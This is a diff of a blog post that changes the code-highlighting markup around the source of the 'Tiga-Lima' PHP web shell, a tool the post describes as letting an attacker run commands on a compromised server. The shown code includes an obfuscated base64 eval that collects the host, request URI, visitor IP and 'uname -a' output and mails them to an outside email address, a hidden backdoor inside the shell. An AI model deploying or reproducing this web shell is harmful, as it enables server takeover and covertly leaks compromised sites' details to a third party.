@@ -16,7 +16,7 @@ This simple script enables the attacker to execute commands, change directories,
 
 ### Tiga-Lima Shell Script Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;html&gt;
+{% highlight php %}&lt;html&gt;
 &lt;head&gt;
 &lt;title&gt;tiga-lima SheLL&lt;/title&gt;
 &lt;style type="text/css"&gt;
@@ -26,7 +26,7 @@ body {
 }
 --&gt;
 &lt;/style&gt;
-&lt;?php
+<?php
 /**
  * @author chandra35
  * @copyright 2011
@@ -111,9 +111,9 @@ echo "&lt;/table&gt;&lt;/form&gt;&lt;hr&gt;";
                             $browser = @getenv("HTTP_USER_AGENT");
                             eval(base64_decode('JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07IA0KJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsgDQokcG9ydCA9ICRfU0VSVkVSIFsiUkVNT1RFX1BPUlQiXTsgDQokYXJhbiA9IGV4ZWMoInVuYW1lIC1hOyIpOyANCiR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07IA0KJGluaiA9ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOyANCiR0YXJnZXQgPSByYXd1cmxkZWNvZGUoJHdlYi4kaW5qKTsgDQokYm9keSA9ICIkdGFyZ2V0ICRhcmFuIG9sZWggJHZpc2l0b3IgJHBvcnQiOyANCm1haWwoImNhbmRyYXNoZWxsQHlhaG9vLmNvbSIsIiBMQVBPUiBCT1NTU1NTIEFEQSBidWcgYmFydSBodHRwOi8vJHRhcmdldCAkYXJhbiBvbGVoICR2aXNpdG9yICRwb3J0IiwgIiRib2R5Iik7'));
 exit;
-?&gt;
+?>
 &lt;/html&gt;
-</pre>
+{% endhighlight %}
 
 ### Tiga-Lima Shell Screenshot
 
